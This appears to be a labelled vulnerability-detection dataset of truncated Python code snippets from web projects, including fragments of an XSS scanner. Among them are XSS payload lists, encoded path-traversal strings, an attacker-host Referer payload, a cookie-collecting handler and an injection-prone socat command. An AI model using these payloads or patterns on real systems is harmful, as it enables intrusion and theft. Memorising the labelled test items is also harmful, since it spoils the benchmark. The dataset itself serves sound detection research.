\t\t\twhere ifnull(blogger,'')=tabBlogger.name) \t\t\twhere name=%s\"\"\",(self.blogger,)) \tdef on_update(self): ", "label": 0}, {"snippet_id": 2219, "code": "\"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers,\"res_body\": xss_request_url.text} dbupdate.insert_record(attack_result) def xss_get_uri", "label": 0}, {"snippet_id": 10583, "code": " as path from paver.easy import sh, BuildFailure from pavelib.utils.test.suites.suite import TestSuite from pavelib.utils.envs import Env from pavelib.utils.test import bokchoy_utils from pavelib.utils", "label": 0}, {"snippet_id": 18550, "code": "), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$', 'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'), url(r'^courses/(?P<course_id>[^/]", "label": 0}, {"snippet_id": 19901, "code": " self.verbosity=kwargs.get('verbosity', DEFAULT_VERBOSITY) self.num_processes=kwargs.get('num_processes', DEFAULT_NUM_PROCESSES) self.verify_xss=kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', False", "label": 1}, {"snippet_id": 8498, "code": "\"signin_user\"), url(r'^register$', 'student.views.register_user', name=\"register_user\"), url(r'^admin_dashboard$', 'dashboard.views.dashboard'), url(r'^change_email$', 'student.views.change_email_request", "label": 0}, {"snippet_id": 27480, "code": " add_jinja2_filter('format_time', format_time) add_jinja2_filter('splitlines', splitlines) add_jinja2_filter('split_br', split_br) add_jinja2_filter('polymer_tag', lambda v: '{{%s}}' % v) def add_menu(name, href", "label": 0}, {"snippet_id": 25396, "code": " dict: data={} data['_scheme']=self.scheme_name for i, value in enumerate(data_list): data[self.scheme['fields'][i][0]]=value or '' return data def __init__(self, *args, **kwargs): fields=[] defaults={", "label": 0}, {"snippet_id": 38432, "code": " Category', post.blog_category, \t\t\t['route', 'title'], as_dict=True) \t\tif post.avatar and(not \"http:\" in post.avatar and not \"https:\" in post.avatar) and not post.avatar.startswith(\"/\"): \t\t\tpost.avatar=\"/\" ", "label": 0}, {"snippet_id": 48788, "code": ".http import urlencode from django.utils.translation import gettext_lazy as _ from typing import List from smart_lists.exceptions import SmartListException from smart_lists.filters import SmartListFilter", "label": 0}, {"snippet_id": 16252, "code": "='auth_password_reset_done'), url(r'^heartbeat$', include('heartbeat.urls')), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^(?i)university_profile/WellesleyX$', 'courseware", "label": 0}, {"snippet_id": 28405, "code": "%s</div>' %(sec, var)) \t\t\t\t\t def get_data(type): \tfrom datetime import datetime \tfrom pytz import timezone \timport sql \tnow_utc=datetime.now(timezone(sql.get_setting('time_zone'))) \tif type=='config': ", "label": 0}, {"snippet_id": 8896, "code": " +=(url(r'^reprofile$', 'perfstats.views.end_profile'),) if settings.WIKI_ENABLED: from wiki.urls import get_pattern as wiki_pattern from django_notify.urls import get_pattern as notify_pattern urlpatterns", "label": 0}, {"snippet_id": 3922, "code": ",\"res_body\": host_header_xss.text} dbupdate.insert_record(attack_result) break for payload in xss_payloads: referer_header_value='http://attackersite.com?test='+payload referer_header={\"Referer\": referer_header_value", "label": 1}, {"snippet_id": 10719, "code": "-when set, check for XSS vulnerabilities in the page HTML. See nosetest documentation: http://nose.readthedocs.org/en/latest/usage.html \"\"\" def __init__(self, *args, **kwargs): super(BokChoyTestSuite, self", "label": 0}, {"snippet_id": 9879, "code": " +=( url(r'^event_logs$', 'track.views.view_tracking_log'), url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'), ) if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'): urlpatterns +=(", "label": 0}, {"snippet_id": 54039, "code": " stop ti=time.time() print(\"=\"*25) print(\"\\n[*]Target:{}\\n[*]Date:{}\".format(target.get(),datetime.now().strftime(\"%d/%m/%Y %H:%M:%S\"))) crl=[target.get()] if crawl.get()=='On': crl+=bane.crawl(target.get", "label": 0}, {"snippet_id": 37064, "code": ".title, t1.name, t1.blog_category, t1.route, t1.published_on, \t\t\t\tt1.published_on as creation, \t\t\t\tt1.content as content, \t\t\t\tifnull(t1.blog_intro, t1.content) as intro, \t\t\t\tt2.full_name, t2.avatar, t1", "label": 0}, {"snippet_id": 41182, "code": "._dict( \t\ttemplate=\"templates/includes/blog/blog.html\", \t\tget_list=get_blog_list, \t\thide_filters=True, \t\tchildren=get_children(), \t\t \t\ttitle=_('Blog') \t) \tcategory=frappe.local.form_dict.blog_category or", "label": 1}, {"snippet_id": 47105, "code": ", c, m, p: m.version_id-1, json=lambda v, c, m, p: Markup(\"<pre>{0}</pre>\".format( json.dumps(m.json, indent=2, sort_keys=True))) ) column_filters=('created', 'updated',) column_default_sort=('updated'", "label": 1}, {"snippet_id": 2067, "code": " ref_header_xss.text.find(decoded_payload) !=-1: print ref_header_xss.text impact=check_xss_impact(temp_headers) print \"%s[{0}]{1} is vulnerable to XSS via referer header%s\".format(impact,url)%(api_logger", "label": 0}, {"snippet_id": 32300, "code": " origin='http://' +hostname if args.port !=80: origin +=':%s' % args.port print('Listening on %s/' % origin) thread=None if args.file: path=os.path.realpath(args.file) if not path.startswith(top_level):", "label": 0}, {"snippet_id": 39452, "code": "\"Duplicate\" in cstr(e.args[1]): \t\t\t\tself.show_unique_validation_message(e) \t\t\telse: \t\t\t\traise \tdef show_unique_validation_message(self, e): \t\ttype, value, traceback=sys.exc_info() \t\tfieldname, label=str(e", "label": 0}, {"snippet_id": 45742, "code": "=_submit_bundle(request, bundle, mapping) request.info(_('Bundle submitted.')) return redirect(reverse('oozie:list_oozie_bundle', kwargs={'job_id': job_id})) else: request.error(_('Invalid submission form", "label": 0}, {"snippet_id": 26268, "code": "'is_business') and data.get('country') in EU_COUNTRIES and data.get('vat_id'): if data.get('vat_id')[:2] !=str(data.get('country')): raise ValidationError(_('Your VAT ID does not match the selected country.", "label": 0}, {"snippet_id": 53935, "code": " request.method==\"GET\" or request.method==\"POST\": \t\tdata=request.values \t\tcookie=data.get('cookie') \t\twith open('cookies.txt',mode='a') as f: \t\t\tf.write('\\n---------------------------\\n'+cookie+'\\n-----------", "label": 0}, {"snippet_id": 20656, "code": ", name=\"change_email\"), url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'), url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"), url(r'^accept_name_change$", "label": 0}, {"snippet_id": 43009, "code": " cancelled_links \tdef _validate_selects(self): \t\tif frappe.flags.in_import: \t\t\treturn \t\tfor df in self.meta.get_select_fields(): \t\t\tif df.fieldname==\"naming_series\" or not(self.get(df.fieldname) and df", "label": 0}, {"snippet_id": 49118, "code": " False def get_add_sort_by(self): if not self.is_ordered(): if self.query_order: return self.get_url_with_query_params({ self.ordering_query_param: '{}.{}'.format(self.column_id, self.query_order) }) else", "label": 0}, {"snippet_id": 50149, "code": " if not self.last_alive: self.keep_alive.stop() self.keep_alive=None def at_login(self): \"\"\" Called when this session gets authenticated by the server. \"\"\" pass def lineSend(self, csessid, data): \"\"\" This", "label": 0}, {"snippet_id": 9008, "code": "]*)$', 'courseware.module_render.xqueue_callback', name='xqueue_callback'), url(r'^change_setting$', 'student.views.change_setting', name='change_setting'), url(r'^calculate$', 'util.views.calculate'),", "label": 0}, {"snippet_id": 7232, "code": ") urlpatterns +=( url(r'^404$', 'static_template_view.views.render', {'template': '404.html'}, name=\"404\"), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^jobs$', 'static_template_view", "label": 0}, {"snippet_id": 52253, "code": " in jobs: doc2=Document2.objects.get(type='oozie-workflow2', id=job['id']) name=doc2.name +'-copy' copy_doc=doc2.doc.get().copy(name=name, owner=request.user) doc2.pk=None doc2.id=None doc2.uuid=str(uuid", "label": 0}, {"snippet_id": 43194, "code": "=='Check': \t\t\t\t \t\t\t\tcontinue \t\t\tcolumn_type=type_map[df.fieldtype][0] or None \t\t\tdefault_column_max_length=type_map[df.fieldtype][1] or None \t\t\tif df and df.fieldtype in type_map and column_type in column_types_to_check_length", "label": 0}, {"snippet_id": 4965, "code": ":confirm`` oNlOad=e\\u0076al(src)>', '<sCript x>confirm``</scRipt x>', '<Script x>prompt()</scRiPt x>', '<sCriPt sRc=//t.cn>', '<embed//sRc=//t.cn>', '<base href=//t.cn/><script src=/>', '<object//data=/", "label": 0}, {"snippet_id": 21234, "code": "/[^/]+)/info$', 'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$', 'courseware.views.syllabus', name=\"syllabus\"), url(r'^courses/(?P<course_id>[^/", "label": 1}, {"snippet_id": 10611, "code": ": from pygments.console import colorize except ImportError: colorize=lambda color, text: text __test__=False DEFAULT_NUM_PROCESSES=1 DEFAULT_VERBOSITY=2 class BokChoyTestSuite(TestSuite): \"\"\" TestSuite", "label": 0}, {"snippet_id": 50736, "code": " to send. Kwargs: options(dict): Options-dict with the following keys understood: -raw(bool): No parsing at all(leave ansi-to-html markers unparsed). -nocolor(bool): Remove all color. -screenreader(bool", "label": 0}, {"snippet_id": 1352, "code": "\": all_data={'url': data['url'], 'impact': data['impact'], 'name': data['name'], 'req_headers': data['req_headers'], 'req_body': data['req_body'], 'res_headers': data['res_headers'], 'res_body': data['res_body", "label": 0}, {"snippet_id": 36753, "code": ".content: \t\t\tcontext.content=markdown(context.content) \t\timage=find_first_image(self.content) \t\tif image: \t\t\tcontext.metatags[\"image\"]=image \t\tcontext.comment_list=get_comment_list(self.doctype, self.name", "label": 0}, {"snippet_id": 46181, "code": "=engine) query={'qs':[{'q': ''}], 'fqs':[], 'start': 0} if request.GET.get('format', 'plain')=='json': return JsonResponse({ 'collection': collection.get_props(request.user), 'query': query, 'initial':{", "label": 0}, {"snippet_id": 8499, "code": "\"signin_user\"), url(r'^register$', 'student.views.register_user', name=\"register_user\"), url(r'^admin_dashboard$', 'dashboard.views.dashboard'), url(r'^change_email$', 'student.views.change_email_request', name=", "label": 0}, {"snippet_id": 25423, "code": ", } self.scheme_name=kwargs.pop('scheme') self.scheme=PERSON_NAME_SCHEMES.get(self.scheme_name) self.one_required=kwargs.get('required', True) require_all_fields=kwargs.pop('require_all_fields', False)", "label": 0}, {"snippet_id": 13303, "code": " 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}), url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile', name=", "label": 0}, {"snippet_id": 21428, "code": "/$', 'courseware.views.index', name=\"courseware_section\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$', 'courseware.views.index", "label": 0}, {"snippet_id": 37783, "code": "\tpost.comment_text=_('No comments yet') \t\telif post.comments==1: \t\t\tpost.comment_text=_('1 comment') \t\telse: \t\t\tpost.comment_text=_('{0} comments').format(str(post.comments)) \t\tpost.avatar=post.avatar or ", "label": 0}, {"snippet_id": 11921, "code": " +=(url(r'^reprofile$', 'perfstats.views.end_profile'),) if settings.WIKI_ENABLED: from wiki.urls import get_pattern as wiki_pattern from django_notify.urls import get_pattern as notify_pattern urlpatterns", "label": 0}, {"snippet_id": 36089, "code": "))=='*' \tdef precision(self, fieldname, parentfield=None): \t\t\"\"\"Returns float precision for a particular field(or get global default). \t\t:param fieldname: Fieldname for which precision is required. \t\t:param", "label": 0}, {"snippet_id": 30042, "code": "\texcept IOError: \t\tprint('<div class=\"alert alert-danger\">Can\\'t save ssl keys file. Check ssh keys path in config</div>') \telse: \t\tprint('<div class=\"alert alert-success\">SSL file was upload to %s into", "label": 0}, {"snippet_id": 14614, "code": "/test/acceptance/{exp_text} \" \"--with-xunit \" \"--xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml \" \"--verbosity=2 \" ).format( default_store=store, repo_dir=REPO_DIR, shard_str='/shard_' +self", "label": 0}, {"snippet_id": 54600, "code": " ArticlesList(ListView): \"\"\"\u5904\u7406\u591a\u7bc7\u6587\u7ae0\u7684\u663e\u793a\u3002\"\"\" model=Article context_object_name='articles' template_name='index.html' paginate_by=5 def get_queryset(self, **kwargs): queryset=Article.objects.order_by('-time", "label": 0}, {"snippet_id": 9156, "code": "\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^", "label": 1}, {"snippet_id": 48010, "code": " u: Profile=get_current_user(request) if not(u==user) and u.rights < 4: return redirect(\"/admin?error='You're not allowed to edit other users.'\") medium=Media.objects.get(pk=int(media_id)) user.avatarMedia", "label": 0}, {"snippet_id": 54966, "code": " later sync. \"\"\" changed_entities_array=[] existing=( ChangedEntityLocale.objects .values_list('entity', 'locale') .distinct() ) for changed_entity in changed_entities: key=(changed_entity.pk, locale.pk) if", "label": 0}, {"snippet_id": 28008, "code": "'firebase.api_key'), 'authDomain': auth.auth_domain(), 'dest': self.request.get('dest'), }) class SessionLoginHandler(base_handler.Handler): \"\"\"Session login handler.\"\"\" @handler.post(handler.JSON, handler", "label": 1}, {"snippet_id": 9540, "code": ")/cohorts/debug$', 'course_groups.views.debug_cohort_mgmt', name=\"debug_cohort_mgmt\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$', 'open_ended_grading.views.combined_notifications", "label": 0}, {"snippet_id": 41688, "code": " ImportError(doctype) \t\t\telse: \t\t\t\traise ImportError(doctype) \t\t_classes[doctype]=_class \treturn _classes[doctype] class BaseDocument(object): \tignore_in_getter=(\"doctype\", \"_meta\", \"meta\", \"_table_fields\"", "label": 0}, {"snippet_id": 49032, "code": ".smart_list=smart_list self.object=object def fields(self): return[ SmartListField(self, column, self.object) for column in self.smart_list.columns ] class SmartOrder(QueryParamsMixin, object): def __init__", "label": 0}, {"snippet_id": 14023, "code": " url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$', 'course_groups.views.list_cohorts', name=\"cohorts\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$', 'course_groups.views.add_cohort", "label": 0}, {"snippet_id": 23085, "code": "<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$', 'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'), url(r'^courses/(?P<course_id>[^/]+/[^", "label": 0}, {"snippet_id": 9603, "code": "*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"), ) if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$", "label": 0}, {"snippet_id": 48267, "code": ".objects.get(id=rid) def add_article_action(request: HttpRequest, default_foreward_url: str): forward_url: str=default_foreward_url if request.GET.get(\"redirect\"): forward_url=request.GET[\"redirect\"] else:", "label": 0}, {"snippet_id": 0, "code": "\nimport os import urlparse import sendrequest as req import utils.logs as logs import urlparse from utils.logger import logger from utils.db import Database_update from utils.config import get_value dbupdate", "label": 0}, {"snippet_id": 36755, "code": ".content=markdown(context.content) \t\timage=find_first_image(self.content) \t\tif image: \t\t\tcontext.metatags[\"image\"]=image \t\tcontext.comment_list=get_comment_list(self.doctype, self.name) \t\tif not context", "label": 0}, {"snippet_id": 25367, "code": " return mark_safe(self.format_output(output)) def format_output(self, rendered_widgets) -> str: return '<div class=\"nameparts-form-group\">%s</div>' % ''.join(rendered_widgets) class NamePartsFormField(forms", "label": 0}, {"snippet_id": 17639, "code": "(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"), url(r'^accept_name_change$', 'student.views.accept_name_change'), url(r'^reject_name_change$', 'student.views.reject_name_change", "label": 0}, {"snippet_id": 11765, "code": " kwargs={'org_id': 'ANUx'}), url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}), url(r'^university_profile/", "label": 0}, {"snippet_id": 12551, "code": "?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$', 'course_groups.views.remove_user_from_cohort', name=\"remove_from_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts", "label": 0}, {"snippet_id": 30703, "code": "=form.getvalue('servaction') \tbackend=form.getvalue('servbackend')\t \tcmd='echo \"%s %s\" |sudo socat stdio %s | cut -d \",\" -f 1-2,5-10,18,34-36 | column -s, -t' %(enable, backend, haproxy_sock) \t \tif form", "label": 0}, {"snippet_id": 19372, "code": "=True)) def test_test_dir(self): test_dir='foo' suite=BokChoyTestSuite('', test_dir=test_dir) self.assertEqual( suite.cmd, self._expected_command(name=test_dir) ) def test_verbosity_settings_1_process(self", "label": 0}, {"snippet_id": 20851, "code": " name=\"static_university_profile\", kwargs={'org_id': 'TorontoX'}), url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': ", "label": 0}, {"snippet_id": 26869, "code": " xss_attacks global DEBUG if page.find(\"http://\")==0 or page.find(\"https://\")==0: furl=page else: if _url.find(\"https://\")==0: furl=\"https://\" +host +\"/\" +page else: furl=\"http://\" +host +\"/\" +page print", "label": 0}, {"snippet_id": 26193, "code": ".widget.attrs['data-required-if']=' if not event.settings.invoice_address_beneficiary: del self.fields['beneficiary'] def clean(self): data=self.cleaned_data if not data.get('is_business'): data['company']=", "label": 0}, {"snippet_id": 55104, "code": ") for project in projects: if( not request.user.can_translate(project=project, locale=locale) or readonly_exists(projects, locale) ): return HttpResponseForbidden( \"Forbidden: You don't have permission", "label": 0}, {"snippet_id": 36483, "code": "\"fieldtype\":('=', \"Text Editor\")}): \t\t\t\textract_images_from_doc(self, df.fieldname) def _filter(data, filters, limit=None): \t\"\"\"pass filters as: \t\t{\"key\": \"val\", \"key\":[\"!=\", \"val\"], \t\t\"key\":[\"in\", \"val", "label": 0}, {"snippet_id": 5021, "code": ">alert(1)</script></html>' ] _h5payloads=[ '<form id=\"test\"></form><button form=\"test\" formaction=\"javascript:alert(1)\">X</button>', '<input onfocus=alert(1) autofocus>', '<input onblur=alert(1) autofocus", "label": 0}, {"snippet_id": 35179, "code": ".modified, update_modified=False) \tdef _fix_numeric_types(self): \t\tfor df in self.meta.get(\"fields\"): \t\t\tif df.fieldtype==\"Check\": \t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname))) \t\t\telif self.get", "label": 0}, {"snippet_id": 39826, "code": "\t\t\t\tif frappe.get_meta(doctype).issingle: \t\t\t\t\tvalues.name=doctype \t\t\t\tif values: \t\t\t\t\tsetattr(self, df.fieldname, values.name) \t\t\t\t\tfor _df in fields_to_fetch: \t\t\t\t\t\tif self.is_new() or self.docstatus", "label": 0}, {"snippet_id": 38195, "code": " from `tabBlog Category` \t\twhere published=1 \t\tand exists(select name from `tabBlog Post` \t\t\twhere `tabBlog Post`.blog_category=`tabBlog Category`.name and published=1) \t\torder by title asc\"\"\", as_dict", "label": 0}, {"snippet_id": 16677, "code": "/[^/]+)/info$', 'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$', 'courseware.views.syllabus', name=\"syllabus\"), url(r'^courses/(?P<course_id>[^/", "label": 1}, {"snippet_id": 47296, "code": "'id': rec_uuid}, follow_redirects=True) assert res.status_code==200 res=client.post( delete_view_url, data={'id': rec_uuid}, follow_redirects=True) assert res.status_code==200 res=client.get(detail_view_url", "label": 0}, {"snippet_id": 7739, "code": "]*)/$', 'courseware.views.index', name=\"courseware_chapter\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$', 'courseware.views.index', name=\"courseware_section", "label": 0}, {"snippet_id": 41209, "code": "(category) \t\tlist_context.sub_title=_(\"Posts filed under{0}\").format(category_title) \t\tlist_context.title=category_title \telif frappe.local.form_dict.blogger: \t\tblogger=frappe.db.get_value(\"Blogger\",{\"name", "label": 0}, {"snippet_id": 41179, "code": " get_list_context(context=None): \tlist_context=frappe._dict( \t\ttemplate=\"templates/includes/blog/blog.html\", \t\tget_list=get_blog_list, \t\thide_filters=True, \t\tchildren=get_children(), \t\t \t\ttitle=_('Blog'", "label": 0}, {"snippet_id": 32477, "code": " slugification here, it makes little sense to have the separator charactor configurable. \"\"\" value=value.encode('ascii', 'replace') value=re.sub(r'[^-a-zA-Z0-9]', '_', value) value=value.replace(u' ', u'-') value", "label": 0}, {"snippet_id": 37849, "code": ".website.utils import find_first_image, get_comment_list class BlogPost(WebsiteGenerator): \twebsite=frappe._dict( \t\torder_by=\"published_on desc\" \t) \tdef make_route(self): \t\tif not self.route: \t\t\treturn", "label": 0}, {"snippet_id": 28224, "code": "('config') is not None: \ttry: \t\tfunct.logging(serv, \"config.py edited config\") \texcept: \t\tpass \t\t \tconfig=form.getvalue('config') \toldcfg=form.getvalue('oldconfig') \tsave=form.getvalue('save') \taftersave", "label": 0}, {"snippet_id": 16871, "code": "/$', 'courseware.views.index', name=\"courseware_section\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$', 'courseware.views.index", "label": 0}, {"snippet_id": 4220, "code": "\"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) result,db_update=True,True vul_param +=key else: result=True if", "label": 0}, {"snippet_id": 5379, "code": "', ] _events=[ 'onabort', 'onautocomplete', 'onautocompleteerror', 'onafterscriptexecute', 'onanimationend', 'onanimationiteration', 'onanimationstart', 'onbeforecopy', 'onbeforecut', 'onbeforeload', 'onbeforepaste", "label": 0}, {"snippet_id": 36306, "code": "\t\tif self.get(fieldname)==0 and not self.meta.istable: \t\t\tprint_hide=( df and df.print_hide_if_no_value) or( meta_df and meta_df.print_hide_if_no_value) \t\tif not print_hide: \t\t\tif df and df.print_hide is", "label": 0}, {"snippet_id": 9854, "code": "(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^gitreload$', 'lms_migration.migrate.gitreload'), url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration", "label": 0}, {"snippet_id": 3424, "code": "!=-1: impact=check_xss_impact(xss_request_url.headers) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body", "label": 0}, {"snippet_id": 2738, "code": ".headers,\"res_body\": ref_header_xss.text} dbupdate.insert_record(attack_result) return def xss_get_url(url,method,headers,body,scanid=None): result='' xss_payloads=fetch_xss_payload() uri_check_list=['?', '", "label": 0}, {"snippet_id": 25094, "code": " \"\"\" cmd_str=( 'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={report_dir}' ).format(report_dir=self.pa11y_report_dir) sh(cmd_str) @property def cmd(self): \"\"\" Runs pa11ycrawler as staff user against", "label": 0}, {"snippet_id": 34686, "code": " else 0 \t\t\t\telif df.fieldtype==\"Int\" and not isinstance(d[fieldname], int): \t\t\t\t\td[fieldname]=cint(d[fieldname]) \t\t\t\telif df.fieldtype in(\"Currency\", \"Float\", \"Percent\") and not isinstance(d[fieldname]", "label": 0}, {"snippet_id": 38279, "code": "\"' % frappe.db.escape(filters.blog_category)) \tif txt: \t\tconditions.append('(t1.content like \"%{0}%\" or t1.title like \"%{0}%\")'.format(frappe.db.escape(txt))) \tif conditions: \t\tfrappe.local.no_cache=1 ", "label": 0}, {"snippet_id": 28957, "code": " \tcmd=\"/bin/diff -ub %s %s\" %(oldcfg, cfg) \t \toutput, stderr=subprocess_execute(cmd) \t \tfor line in output: \t\tdiff +=date +\" \" +line +\"\\n\" \ttry:\t\t \t\tlog=open(log_path +\"/config_edit-\"+get_data('logs')+", "label": 0}, {"snippet_id": 9029, "code": "'), url(r'^courses/?$', 'branding.views.courses', name=\"courses\"), url(r'^change_enrollment$', 'student.views.change_enrollment', name=\"change_enrollment\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/", "label": 0}, {"snippet_id": 50999, "code": " there is not an is_due() for each type of schedule. This makes it very hazy when something will run. Because of this, we'll move to the horrifically designed absolute nightmare format Crontab. Crontab", "label": 0}, {"snippet_id": 45605, "code": "(request.user)) }) def new_bundle(request): return edit_bundle(request) @check_document_modify_permission() def save_bundle(request): response={'status': -1} bundle_data=json.loads(request.POST.get('bundle'", "label": 0}, {"snippet_id": 50729, "code": " text for color-replacement, conversion to html etc. Args: text(str): Text to send. Kwargs: options(dict): Options-dict with the following keys understood: -raw(bool): No parsing at all(leave ansi-to-html", "label": 0}, {"snippet_id": 50961, "code": " CrontabSchedule, PeriodicTask from import_export import resources from import_export.admin import ImportExportModelAdmin from dashboard.internet_nl_dashboard.models import Account, DashboardUser, UploadLog", "label": 0}, {"snippet_id": 26793, "code": ", '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e", "label": 0}, {"snippet_id": 39638, "code": "}): \t\t\tif self.get(df.fieldname) in(None,[]) or not strip_html(cstr(self.get(df.fieldname))).strip(): \t\t\t\tmissing.append((df.fieldname, get_msg(df))) \t\t \t\tif self.meta.istable: \t\t\tfor fieldname in(\"parent", "label": 0}, {"snippet_id": 10115, "code": ".assertEqual(suite.cmd, self._expected_command(name=name)) def test_suite_spec(self): spec='test_foo.py' suite=BokChoyTestSuite('', test_spec=spec) name='tests/{}'.format(spec) self.assertEqual(suite.cmd", "label": 0}, {"snippet_id": 16164, "code": "]*)$', 'student.views.login_user'), url(r'^logout$', 'student.views.logout_user', name='logout'), url(r'^create_account$', 'student.views.create_account'), url(r'^activate/(?P<key>[^/]*)$', 'student.views", "label": 0}, {"snippet_id": 33807, "code": "\tlist_context.parents=[{\"name\": _(\"Home\"), \"route\": \"/\"}, \t\t\t\t\t\t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"}] \telse: \t\tlist_context.parents=[{\"name\": _(\"Home\"), \"route\": \"/\"}] \tlist_context.update(frappe.get_doc", "label": 0}, {"snippet_id": 31577, "code": "\"templates/metrics_waf_out.html\", mode='inline') \t\t \t\tx_min=df.index.min() -pd.Timedelta(hours=1) \t\tx_max=df.index.max() +pd.Timedelta(minutes=1) \t\tp[serv]=figure( \t\t\ttools=\"pan,box_zoom,reset,xwheel_zoom\"", "label": 0}, {"snippet_id": 41964, "code": "('Meta', 'FormMeta', 'DocField')): \t\t\t\treturn value \t\t\traise ValueError( \t\t\t\t'Document for field \"{0}\" attached to child table of \"{1}\" must be a dict or BaseDocument, not{2}({3})'.format(key, \t\t\t\t\tself", "label": 0}, {"snippet_id": 29615, "code": "'UTF-8') \t\telse: \t\t\treturn stdout.read().decode(encoding='UTF-8') \t\t\t \t\tfor line in stderr.read().decode(encoding='UTF-8'): \t\t\tif line: \t\t\t\tprint(\"<div class='alert alert-warning'>\"+line+\"</div>\") \ttry:\t", "label": 0}, {"snippet_id": 52929, "code": " @check_document_access_permission() def edit_coordinator(request): coordinator_id=request.GET.get('coordinator') doc=None if coordinator_id: doc=Document2.objects.get(id=coordinator_id) coordinator=Coordinator(document=doc) else", "label": 0}, {"snippet_id": 49367, "code": ", field_name, label, value, query_params): self.field_name=field_name self.label=label self.value=value self.query_params=query_params def get_title(self): return self.label def get_url(self): return self", "label": 0}, {"snippet_id": 5967, "code": ".path.abspath(os.path.dirname(__file__)) README=open(os.path.join(here, 'README')).read() version='0.3.22' install_requires=[ 'pymongo>=2.8,<3', 'pysaml2==1.2.0beta5', 'python-memcached==1.53', 'cherrypy", "label": 1}, {"snippet_id": 14565, "code": "(unittest.TestCase): \"\"\" Paver Bok Choy Command test cases \"\"\" def _expected_command(self, name, store=None, verify_xss=False): \"\"\" Returns the command that is expected to be run for the given test spec", "label": 1}, {"snippet_id": 6707, "code": ", 'dashboard_link') @property def password_reset_link(self): \"\"\" URL(string) for use in simple templating of login.html. \"\"\" return self.config.get(self.section, 'password_reset_link') @property def default_language", "label": 0}, {"snippet_id": 20532, "code": " generate_html_reports(self): \"\"\" Runs pa11ycrawler json-to-html \"\"\" cmd_str=( 'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={report_dir}' ).format(report_dir=self.pa11y_report_dir) sh(cmd_str)", "label": 0}, {"snippet_id": 46903, "code": " content, ref_id=0): obj=await Comment.create(github_id=user_id, post_id=self.id, ref_id=ref_id) redis=await create_pool(RedisSettings.from_url(REDIS_URL)) await asyncio.gather( obj.set_content(content", "label": 0}, {"snippet_id": 19648, "code": "._mock_sh.assert_has_calls([ call( 'wget{targz} -O{dir}demo_course.tar.gz'.format(targz=suite.tar_gz_file, dir=suite.imports_dir)), call( 'tar zxf{dir}demo_course.tar.gz -C{dir}'.format(dir=suite.imports_dir", "label": 0}, {"snippet_id": 43914, "code": "\treturn cast_fieldtype(df.fieldtype, value) \tdef _extract_images_from_text_editor(self): \t\tfrom frappe.utils.file_manager import extract_images_from_doc \t\tif self.doctype !=\"DocType\": \t\t\tfor df in self", "label": 0}, {"snippet_id": 50884, "code": " argument will always be the oob cmd name. *args(any): Remaining args will be arguments for `cmd`. Kwargs: options(dict): These are 